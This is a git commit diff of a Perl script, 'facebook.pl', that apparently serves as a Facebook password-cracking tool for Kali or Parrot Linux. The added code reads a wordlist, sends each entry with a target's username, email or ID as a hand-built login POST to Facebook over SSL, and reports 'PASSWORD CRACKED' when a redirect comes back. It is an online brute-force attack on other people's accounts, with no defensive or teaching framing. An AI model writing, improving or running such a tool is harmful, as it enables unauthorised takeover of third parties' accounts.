bc3bba8f7320fc20c669e6a1c72cada1d5f8b28e
abdesalam belmerabet <teclamp10@gmail.com>
2017-09-17 13:11:35 -0700

    Update facebook.pl

--- facebook.pl
+++ facebook.pl
@@ -1,3 +1,6 @@
+# Date: 17/09/2017
+# Distro: Kali Linux + Parrot Sec ....
+# Author: ABDEALAM BELMERABET
 #!/usr/bin/perl
 
 use strict;
@@ -8,7 +11,7 @@ use Net::SSLeay::Handle;
 my $host = "www.facebook.com";
 my $port = "443";
 
-print color("bold green"), "\n", q "
+print color("light green"), "\n", q "
 
 ████████╗███████╗ ██████╗  ██╗      █████╗ ███╗   ███╗██████╗ 
 ╚══██╔══╝██╔════╝██╔════╝  ██║     ██╔══██╗████╗ ████║██╔══██╗
@@ -17,7 +20,7 @@ print color("bold green"), "\n", q "
    ██║   ███████╗╚██████╗  ███████╗██║  ██║██║ ╚═╝ ██║██║    
    ╚═╝   ╚══════╝ ╚═════╝  ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝   ", "\n";
 
-print "\nEnter [Username Or Account ID ]: 
+print "\nEnter [Username or Email or Account ID ]: 
 		                         └─► ";
 chomp ( my $user = <STDIN> );
 
@@ -30,10 +33,72 @@ $user =~ s/profile.php//;
 $user =~ s/\?id\=//;
 
 print "\nEnter [ wordlist]:
-                                         └─► ";
+                  └─► ";
 chomp ( my $wordlist = <STDIN> );
 
-print "\nEmail: $user\@facebook.com";
+print "\nEmail: $user";
 print "\nCracking password...\n\n";
 
 open ( my $list, $wordlist) or die "\nERROR: there is a problem .\n\n";
+
+while (<$list>) {
+	chomp ($_);
+	$_ =~ s/([^^A-Za-z0-9\-_.!~*'()])/ sprintf "%%%0x", ord $1 /eg;
+
+	my $a = "POST /login.php HTTP/1.1";
+	my $b = "Host: www.facebook.com";
+	my $c = "Connection: close";
+	my $e = "Cache-Control: max-age=0";
+	my $f = "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
+	my $g = "Origin: https://www.facebook.com";
+	my $h = "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31";
+	my $i = "Content-Type: application/x-www-form-urlencoded";
+	my $j = "Accept-Encoding: gzip,deflate,sdch";
+	my $k = "Accept-Language: en-US,en;q=0.8";
+	my $l = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3";
+
+	my $cookie = "cookie: datr=80ZzUfKqDOjwL8pauwqMjHTa";
+	my $post = "lsd=AVpD2t1f&display=&enable_profile_selector=&legacy_return=1&next=&profile_selector_ids=&trynum=1&timezone=300&lgnrnd=031110_Euoh&lgnjs=1366193470&email=$user&pass=$_&default_persistent=0&login=Log+In";
+	my $cl = length($post);
+	my $d = "Content-Length: $cl";
+
+	tie(*SSL, "Net::SSLeay::Handle", $host, $port);
+  
+
+	print SSL "$a\n";
+	print SSL "$b\n";
+	print SSL "$c\n";
+	print SSL "$d\n";
+	print SSL "$e\n";
+	print SSL "$f\n";
+	print SSL "$g\n";
+	print SSL "$h\n";
+	print SSL "$i\n";
+	print SSL "$j\n";
+	print SSL "$k\n";
+	print SSL "$l\n";
+	print SSL "$cookie\n\n";
+
+	print SSL "$post\n";
+
+
+
+	my $success;
+	while ( my $result = <SSL>) {
+		if ($result =~ /Location(.*?)/) {
+			$success = $1;
+		}
+	}
+
+	print "Testing -> $_\n";
+
+	if (defined $success) {
+		print "\nPASSWORD CRACKED -> $_\n";
+		print "\nBye =P\n\n";
+		close SSL;
+		exit;
+	}
+}
+close SSL;
+print "\n";
+exit;
